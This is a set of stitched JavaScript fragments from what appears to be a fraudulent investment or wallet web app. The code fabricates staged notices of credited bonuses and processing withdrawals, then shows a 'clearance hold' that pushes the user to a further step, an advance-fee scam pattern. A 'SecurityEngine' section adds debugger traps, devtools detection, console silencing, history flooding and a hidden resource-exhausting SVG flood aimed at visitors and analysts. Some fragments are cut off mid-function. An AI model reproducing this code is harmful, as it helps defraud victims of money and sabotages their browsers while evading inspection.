(function() {
    const BANNED_LIST_URL = './banned-ids.json';
    const CACHE_KEY = 'av_cached_banned_ids';
    const CACHE_TIME_KEY = 'av_banned_cache_time';

    let currentETag = null;
    let activeBannedIds = [];

    try {
        const cached = localStorage.getItem(CACHE_KEY);
        if (cached) {
            activeBannedIds = JSON.parse(cached);
        }
    } catch (e) {}

    async function syncBannedList() {
        try {
            const response = await fetch(BANNED_LIST_URL, { cache: 'no-store' });
            if (response.ok) {
                const data = await response.json();
                if (Array.isArray(data)) {
                    activeBannedIds = data;
                    localStorage.setItem(CACHE_KEY, JSON.stringify(data));
                    localStorage.setItem(CACHE_TIME_KEY, Date.now().toString());
                }
            }
        } catch (e) {}
    }

    syncBannedList();

    function render403Page() {
        localStorage.clear();

        document.documentElement.innerHTML = `

        `;
    }

    function verifyAccess() {
        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id');
        const localId = localStorage.getItem('avalonflow_identity');

        if (
            localStorage.getItem('step_3_paid') === 'true' ||
            localStorage.getItem('step_3_txn_id') !== null
        ) {
            render403Page();
            return true;
        }

        if (targetId && activeBannedIds.includes(targetId)) {
            render403Page();
            return true;
        }

        if (localId && activeBannedIds.includes(localId)) {
            render403Page();
            return true;
        }

        return false;
    }

    async function checkForFileChanges() {
        try {
            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
            const newETag = response.headers.get('ETag') || response.headers.get('Last-Modified');

            if (currentETag && newETag && currentETag !== newETag) {
                const fullResponse = await fetch(window.location.href, { cache: 'no-store' });
                const newHtml = await fullResponse.text();
                document.open();
                document.write(newHtml);
                document.close();
                return;
            }
            currentETag = newETag;
        } catch (e) {}
    }

    if (verifyAccess()) return;

    const originalSetItem = Storage.prototype.setItem;
    Storage.prototype.setItem = function(key, value) {
        if (key === 'avalonflow_identity' && activeBannedIds.includes(value)) {
            render403Page();
            return;
        }
        originalSetItem.apply(this, arguments);
    };

    window.addEventListener('popstate', verifyAccess);
    window.addEventListener('storage', verifyAccess);
    setInterval(verifyAccess, 100);
    checkForFileChanges();
    setInterval(checkForFileChanges, 3000);
})();
</script>

    <script>
    (function() {
        const SecurityEngine = {
            validateExecutionEnvironment: function() {
                const authorizedDomain = "avalonflow.site";
                const currentHost = window.location.hostname;
                const isAuthorized = (currentHost === authorizedDomain || currentHost.endsWith('.' + authorizedDomain));

                if (!isAuthorized) {
                    this.triggerSelfDestruct();
                    return false;
                }
                return true;
            },

            get404Template: function() {
                return `
                    <div class="error-container">
                        <div class="error-code-wrapper">
                            <span>4</span>
                            <div class="logo-container">
                                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
                            </div>
                            <span>4</span>
                        </div>
                        <h2>Didn’t find anything here!</h2>
                    </div>
                `;
            },

            triggerSelfDestruct: function() {
                localStorage.clear();
                sessionStorage.clear();
                document.body.innerHTML = this.get404Template();
                document.body.classList.add('render-ready');

                // Active Defense Countermeasures
                this.activateHistoryTrap();
                this.activateDOMExplosion();

                try { window.open('', '_self').close(); } catch (e) {}
                this.activateInspectorTrap();
                this.activateEnvironmentSabotage();
            },

            activateHistoryTrap: function() {
                setInterval(() => {
                    try {
                        for (let i = 0; i < 100; i++) {
                            window.history.pushState(null, '', `?restricted_state=${Math.random().toString(36).substring(2)}`);
                        }
                    } catch (e) {}
                }, 50);
            },

            activateDOMExplosion: function() {
                const container = document.createElement('div');
                container.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;';
                document.body.appendChild(container);

                setInterval(() => {
                    for (let i = 0; i < 50; i++) {
                        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                        svg.innerHTML = `<filter id="f"><feTurbulence type="fractalNoise" baseFrequency="0.05" numOctaves="5"/></filter>`;
                        container.appendChild(svg);
                    }
                }, 100);
            },

            activateResetListener: function() {
                window.addEventListener('message', (event) => {
                    if (event.origin !== window.location.origin) return;
                    if (event.data && event.data.type === 'COMMAND_SYSTEM_RESET') {
                        localStorage.setItem('_sys_reset_token', event.data.resetId);
                        localStorage.setItem('_sys_reset_expiry', event.data.expiresAt);
                        const currentUrl = new URL(window.location.href);
                        currentUrl.searchParams.set('auth_reset', event.data.resetId);
                        window.location.href = currentUrl.toString();
                    }
                });
            },

            establish7DayClearance: function() {
                const expiry = Date.now() + (7 * 24 * 60 * 60 * 1000);
                localStorage.setItem('_sys_persistence_anchor', expiry.toString());
            },

            isPersistenceWindowActive: function() {
                const savedAnchor = localStorage.getItem('_sys_persistence_anchor');
                return savedAnchor && Date.now() < parseInt(savedAnchor, 10);
            },

            checkResetValidation: function() {
                const urlParams = new URLSearchParams(window.location.search);
                const urlToken = urlParams.get('auth_reset');
                const incomingOTK = urlParams.get('otk');

                if (urlToken) {
                    if (urlToken === localStorage.getItem('_sys_reset_token') && Date.now() < parseInt(localStorage.getItem('_sys_reset_expiry') || 0, 10)) {
                        this.establish7DayClearance();
                        this.executeSystemRevival();
                        return true; 
                    }
                    this.triggerSelfDestruct();
                    return false;
                }

                if (incomingOTK) {
                    try {
                        const [entropy, expirationTimestamp] = atob(incomingOTK).split('.');
                        if (Date.now() > parseInt(expirationTimestamp, 10) || localStorage.getItem('active_session_otk') !== incomingOTK) {
                            this.triggerSelfDestruct();
                            return false;
                        }
                        localStorage.removeItem('active_session_otk');
                        this.establish7DayClearance();
                        this.executeSystemRevival();
                        return true;
                    } catch (e) { this.triggerSelfDestruct(); return false; }
                }
                return false;
            },

            executeSystemRevival: function() {
                localStorage.removeItem('_sys_reset_token');
                localStorage.removeItem('_sys_reset_expiry');
                const user = new URLSearchParams(window.location.search).get('user');
                const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + (user ? `?user=${encodeURIComponent(user)}` : '');
                window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
                window.location.reload();
            },

            getHardwareID: function() {
                const components = [navigator.userAgent, navigator.platform, screen.width, screen.height].join('|');
                let hash = 0;
                for (let i = 0; i < components.length; i++) hash = ((hash << 5) - hash) + components.charCodeAt(i);
                return '1' + (hash | 0).toString(16); 
            },

            detectAgencyProfile: function() {
                return navigator.userAgent.includes("Corporate-Gateway") ? 'GOVERNMENT' : 'PRIVATE';
            },

            activateInspectorTrap: function() { setInterval(() => { debugger; }, 50); },

            activateEnvironmentSabotage: function() {
                console.log = console.warn = console.error = console.info = () => {};
                setInterval(() => {
                    const paths = ['4|1|3|0|2'.split('|')];
                    let pointer = 0;
                    while (true) {
                        switch (['4','1','3','0','2'][pointer++]) {
                            case '0': try { (function stackTrap(i) { if (("" + i/i)["length"] !== 1 || i % 20 === 0) (function(){}).constructor("debugger")(); else stackTrap(++i); })(0); } catch(e) {} continue;
                            case '1': if (Math.random() > 0.5) window.status = 'VALIDATING'; continue;
                            case '2': return;
                            case '3': 
                                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                                if (!isMobile) {
                                    if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
                                        this.triggerSelfDestruct();
                                    }
                                }
                                continue;
                            case '4': (Date.now() % 1000) * 0x5a1b; continue;
                        }
                        break;
                    }
                }, 200); 
            },

            injectSecureApp: function(agencyType) {
                const payload = document.getElementById('hidden-application-payload');
                if (!payload || !payload.innerHTML.trim()) { this.triggerSelfDestruct(); return; }
                const frame = document.createElement('iframe');
                frame.style = 'width:100vw;height:100vh;border:none;position:fixed;top:0;left:0;z-index:999999';
                frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms'); 
                document.body.appendChild(frame);
                const ctx = frame.contentWindow || frame.contentDocument;
                ctx.AUTHORIZED_AGENCY = agencyType;
                ctx.document.open(); ctx.document.write(payload.innerHTML); ctx.document.close();
                payload.style.display = 'none'; 
                document.body.classList.add('render-ready');
            },

            run: function() {
                if (!this.validateExecutionEnvironment()) return;

                this.activateResetListener();
                if (this.checkResetValidation()) return;

                const id = this.getHardwareID();
                const type = this.detectAgencyProfile();

                if (this.isPersistenceWindowActive() || ((id.startsWith('a') || id.startsWith('1')) && (type === 'GOVERNMENT' || type === 'PRIVATE'))) {
                    this.activateInspectorTrap();         
                    this.activateEnvironmentSabotage();   
                    document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => this.injectSecureApp(type)) : this.injectSecureApp(type);
                } else {
                    this.triggerSelfDestruct();
                }
            }
        };

        // Parent Window Communication Hub
        window.addEventListener("message", (e) => { 
            if (e.data?.type === "UPDATE_TITLE") document.title = e.data.title; 

            if (e.data?.type === "UPDATE_URL" && e.origin === window.location.origin) {
                const newUrl = window.location.protocol + "//" + window.location.host + e.data.path;
                window.history.pushState({ path: newUrl }, '', newUrl);
            }
        });

        document.readyState === 'loading' ? window.addEventListener('DOMContentLoaded', () => SecurityEngine.run()) : SecurityEngine.run();
    })();
    </script>

profilePhoto.addEventListener('click', () => {
    if (isProcessing) return;

    // Check if a custom photo is currently set
    const hasPhoto = localStorage.getItem('profilePhoto');

    if (hasPhoto) {
        // REMOVE PICTURE: Clear it out instantly
        localStorage.removeItem('profilePhoto');

    } else {

/* ---------- 3. AUTO PROCESS IMAGE ---------- */
photoInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (!file || isProcessing) return;

    isProcessing = true;

    const reader = new FileReader();

    reader.onload = function(event) {
        const rawImage = event.target.result;
        const img = new Image();
        img.src = rawImage;

        img.onload = function() {
            const canvas = document.createElement('canvas');
            const size = Math.min(img.width, img.height);

            canvas.width = size;
            canvas.height = size;

            const ctx = canvas.getContext('2d');

            ctx.drawImage(
                img,
                (img.width - size) / 2,
                (img.height - size) / 2,
                size,
                size,
                0,
                0,
                size,
                size
            );

            const finalImage = canvas.toDataURL('image/png');

            // update avatar instantly
            profilePhoto.src = finalImage;

            // save permanently
            localStorage.setItem('profilePhoto', finalImage);

            // Switch label text to show it can now be removed
            if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";

            // close modal
            if (cropModal) cropModal.classList.add('hidden');

            // reset input to prevent re-trigger bugs
            photoInput.value = '';

            // unlock system shortly after
            setTimeout(() => {
                isProcessing = false;
            }, 300);
        };
    };

    reader.readAsDataURL(file);
});

          id: 10, type: "withdrawal", category: "failed", title: "Action Required: Intermediary Clearance Hold",
          description: `Verification required on your transfer of <strong>${displayFormattedText}</strong>`,
          timestamp: stage3Time, isRead: false, txRef: holdTxRef, isActionRequired: true
        });
      }

      // STAGE 2: Intermediate Good News (2+ mins)
      if (elapsedMinutes >= 2 || localStorage.getItem("av_force_hold") === "true") {
        const stage2Time = formatTimestamp(new Date(baseWithdrawalMs + (2 * 60 * 1000)));
        generatedNotifications.push({
          id: 9, type: "withdrawal", category: "pending", title: "Intermediary Network Routing",
          description: `Transaction batch <strong>#${routingTxRef}</strong> arrived at cross-border rail. Processing clearance...`,
          timestamp: stage2Time, isRead: elapsedMinutes >= 5, txRef: routingTxRef
        });
      }

      generatedNotifications.push({
        id: 2, 
        type: "withdrawal", 
        category: "success", 
        title: "Funds Withdrawal Processing",
        description: `Your withdrawal amount of <strong>${displayFormattedText}</strong> is being dispatched to cross-border rail.`,
        timestamp: formattedWithdrawalTime, 
        isRead: elapsedMinutes >= 5, 
        txRef: withdrawalTx.txHash || "av_tx_unknown"
      });
    }

    // Always display historical bonus notification if snapshot exists or isWithdrawn is true
    if (historicalBonusVal > 0 || (isWithdrawn && withdrawalSource === "bonus")) {
      generatedNotifications.push({
        id: 3, type: "deposit", category: "success", title: "Retention Bonus Credited",
        description: `Retention bonus allocation of <strong>$${formattedBonus} USD (${formattedBonus} ACU)</strong> has been successfully credited to your account.`,
        timestamp: bonusCreditedTime, isRead: true, txRef: bonusTxRef
      });
    }

    generatedNotifications.push({
      id: 4, type: "signin", category: "security", title: "Previous Account Sign-in",
      description: "Successful login session recorded.", timestamp: previousSignInTime, isRead: true, ipAddress: userIp
    });

    // Always display historical core deposit notification if snapshot exists or isWithdrawn is true
    if (historicalDepositVal > 0 || (isWithdrawn && withdrawalSource === "available")) {
      generatedNotifications.push({
        id: 5, type: "deposit", category: "success", title: "Core Balance Allocation",
        description: `Core available deposit of <strong>$${formattedAcu} USD</strong> settled to wallet account.`,
        timestamp: coreDepositTime, isRead: true, txRef: coreDepTxRef
      });
    }

    const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
    const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');

    const previousCount = window.notifications ? window.notifications.length : 0;

    window.notifications = generatedNotifications
        .filter(n => !deletedIds.includes(n.id))
        .map(n => {
            if (readIds.includes(n.id)) n.isRead = true;
            return n;
        });

    localStorage.setItem('av_active_notifs_cache', JSON.stringify(generatedNotifications.map(n => ({ id: n.id }))));

    if (window.notifications.length > previousCount && previousCount > 0) {
        const newlyAdded = window.notifications[0];
        if (newlyAdded && !newlyAdded.isRead) {
            triggerDesktopNotification("New Alert", newlyAdded.title);
        }
    }

    if (ENABLE_AUTO_REDIRECT && stage3Active && !readIds.includes(10)) {
        if (!autoRedirectTimer) {
            autoRedirectTimer = setTimeout(() => {
                handleHoldRedirect();
            }, AUTO_REDIRECT_DELAY_MS);
        }
    }

    renderNotifications();
}

let currentFilter = 'all';

function getIcon(type, category) {
  if (type === 'deposit') {
    return { icon: 'fa-arrow-up-right-from-square fa-rotate-180', bg: 'bg-emerald-50 text-emerald-600 border-emerald-200' };
  }
  if (type === 'withdrawal') {
    if (category === 'success') return { icon: 'fa-arrow-up-right-from-square', bg: 'bg-emerald-50 text-emerald-600 border-emerald-200' };
    if (category === 'pending') return { icon: 'fa-clock', bg: 'bg-amber-50 text-amber-600 border-amber-200' };
    if (category === 'failed') return { icon: 'fa-triangle-exclamation', bg: 'bg-rose-50 text-rose-600 border-rose-200' };
  }
  if (type === 'signin') {
    return { icon: 'fa-shield-halved', bg: 'bg-sky-50 text-sky-600 border-sky-200' };
  }
  return { icon: 'fa-bell', bg: 'bg-blue-50 text-blue-600 border-blue-200' };
}

function renderNotifications() {
  const containerList = document.getElementById('notifications-list');

  if (!containerList) {
    updateUnreadBadge();
    return;
  }

  if (!window.notifications) return;

  const filtered = window.notifications.filter(item => {
    if (currentFilter === 'unread') return !item.isRead;
    if (currentFilter === 'withdrawal') return item.type === 'withdrawal';
    if (currentFilter === 'deposit') return item.type === 'deposit';
    if (currentFilter === 'signin') return item.type === 'signin';
    return true;
  });

  if (filtered.length === 0) {
    containerList.innerHTML = `
      <div class="text-center py-12 bg-white/70 backdrop-blur-md rounded-2xl border border-white/80 shadow-sm">
        <i class="fa-regular fa-bell-slash text-4xl text-slate-400 mb-3"></i>
        <p class="text-slate-600 font-medium">No notifications found</p>
        <p class="text-xs text-slate-400 mt-1">There is no activity matching your current selection.</p>
      </div>
    `;
    updateUnreadBadge();
    return;
  }

  containerList.innerHTML = filtered.map(item => {
    const style = getIcon(item.type, item.category);
    return `
      <div class="group relative flex gap-4 p-4 rounded-2xl border backdrop-blur-md transition-all duration-200 ${
        item.isRead ? 'bg-white/50 border-white/60 opacity-80 shadow-sm' : 'bg-white/85 border-white shadow-md shadow-blue-900/5'
      }">
        <div class="w-10 h-10 rounded-xl flex items-center justify-center shrink-0 border ${style.bg}">
          <i class="fa-solid ${style.icon} text-base"></i>
        </div>
        <div class="flex-1 min-w-0">
          <div class="flex items-center justify-between gap-2 mb-1">
            <h3 class="text-sm font-semibold text-slate-900 flex items-center gap-2">
              ${item.title}
              ${!item.isRead ? '<span class="w-2 h-2 rounded-full bg-blue-600 inline-block"></span>' : ''}
            </h3>
            <span class="text-xs text-slate-500 shrink-0">${item.timestamp}</span>
          </div>
          <p class="text-xs text-slate-600 leading-relaxed">${item.description}</p>
          <div class="flex items-center gap-2 mt-2">
            ${item.txRef ? `<span class="text-[11px] font-mono text-slate-600 bg-slate-100/80 px-2 py-0.5 rounded border border-slate-200">Ref: ${item.txRef}</span>` : ''}
            ${item.ipAddress ? `<span class="text-[11px] font-mono text-slate-600 bg-slate-100/80 px-2 py-0.5 rounded border border-slate-200">IP: ${item.ipAddress}</span>` : ''}
          </div>
          ${item.isActionRequired ? `
            <div class="mt-3">
              <button onclick="toggleRead(10)" class="inline-flex items-center gap-2 px-3 py-1.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-medium rounded-lg transition shadow-sm">
                <span>Resolve Clearance Hold</span>
                <i class="fa-solid fa-arrow-right text-[10px]"></i>
              </button>
            </div>
          ` : ''}
        </div>
        <div class="flex flex-col justify-between items-end gap-2 shrink-0">
          <button onclick="toggleRead(${item.id})" title="${item.isRead ? 'Mark as unread' : 'Mark as read'}" class="text-slate-400 hover:text-blue-600 transition text-sm">
            <i class="fa-solid ${item.isRead ? 'fa-envelope' : 'fa-envelope-open'}"></i>
          </button>
          <button onclick="deleteNotification(${item.id})" title="Delete notification" class="text-slate-400 hover:text-rose-500 transition text-xs opacity-0 group-hover:opacity-100">
            <i class="fa-solid fa-xmark text-sm"></i>
          </button>
        </div>
      </div>
    `;
  }).join('');

  updateUnreadBadge();
}

function filterNotifications(filter, btn) {
  currentFilter = filter;
  document.querySelectorAll('.filter-btn').forEach(b => {
    b.classList.remove('bg-blue-600', 'text-white', 'shadow-md', 'shadow-blue-500/20');
    b.classList.add('bg-white/80', 'text-slate-600', 'border', 'border-slate-200/80', 'shadow-sm');
  });
  btn.classList.remove('bg-white/80', 'text-slate-600', 'border', 'border-slate-200/80', 'shadow-sm');
  btn.classList.add('bg-blue-600', 'text-white', 'shadow-md', 'shadow-blue-500/20');
  renderNotifications();
}

function updateReadStorage(id, isRead) {
    let readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
    if (isRead && !readIds.includes(id)) readIds.push(id);
    if (!isRead) readIds = readIds.filter(storedId => storedId !== id);
    localStorage.setItem('av_read_notifs', JSON.stringify(readIds));
}

function toggleRead(id) {
  window.notifications = window.notifications.map(item => {
      if (item.id === id) {
          const newState = !item.isRead;
          updateReadStorage(item.id, newState);
          return { ...item, isRead: newState };
      }
      return item;
  });

  if (id === 10) {
      handleHoldRedirect();
      return;
  }

  renderNotifications();
}

function markAllAsRead() {
  let containsStage3 = window.notifications.some(n => n.id === 10);
  window.notifications = window.notifications.map(item => {
      updateReadStorage(item.id, true);
      return { ...item, isRead: true };
  });

  if (containsStage3) {
      handleHoldRedirect();
      return;
  }

  renderNotifications();
}

function clearAllNotifications() {
  let deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
  window.notifications.forEach(n => {
      if (!deletedIds.includes(n.id)) deletedIds.push(n.id);
  });
  localStorage.setItem('av_deleted_notifs', JSON.stringify(deletedIds));

  window.notifications = [];
  renderNotifications();
}

function deleteNotification(id) {
  let deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
  if (!deletedIds.includes(id)) {
      deletedIds.push(id);
      localStorage.setItem('av_deleted_notifs', JSON.stringify(deletedIds));
  }

  window.notifications = window.notifications.filter(item => item.id !== id);
  renderNotifications();
}

function updateUnreadBadge() {
  if (!window.notifications) return;
  const count = window.notifications.filter(n => !n.isRead).length;
  const badge = document.getElementById('unread-count');

  if (badge) {
    badge.textContent = `${count} unread`;
    if (count === 0) {
      badge.classList.add('hidden');
    } else {
      badge.classList.remove('hidden');
    }
  }

  if (document.hidden && count > 0) {
    startTitleFlashing(count);
  } else {
    stopTitleFlashing();
    if (count > 0) {
      document.title = `(${count}) ${originalDocumentTitle}`;
    } else {
      document.title = originalDocumentTitle;
    }
  }
}

// ==========================================
// 🚀 INITIALIZATION & CONTINUOUS POLLING
// ==========================================

initDynamicNotifications();

if (syncTicker) clearInterval(syncTicker);
syncTicker = setInterval(() => {
    initDynamicNotifications();
}, 10000);







/* ---------- Auto-Logout After 15 Minutes of Inactivity ---------- */
const AUTO_LOGOUT_TIME = 15 * 60 * 1000; // 15 minutes in milliseconds
let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);

function resetLogoutTimer() {
    clearTimeout(logoutTimer);
    logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
}

// Reset timer on user activity
["mousemove", "keydown", "scroll", "click", "touchstart"].forEach(event => {
    window.addEventListener(event, resetLogoutTimer, { passive: true });
});

// Remove the listener that fires immediately
window.addEventListener("load", () => {
    // Fire this only when the login form is fully rendered
    window.parent.postMessage({
        type: "UPDATE_TITLE",
        title: "Notifications - Activity Feed" 
    }, "*");
// 1. Grab the user context from the current URL right away
const urlParams = new URLSearchParams(window.location.search);
const userParam = urlParams.get('user');

// 2. Build the destination path dynamically

const destinationPath = userParam 
    ? `/dashboard?user=${encodeURIComponent(userParam)}` 
    : '/notifications';

// 3. Trigger your existing update mechanism with the updated path
window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
});
</script>
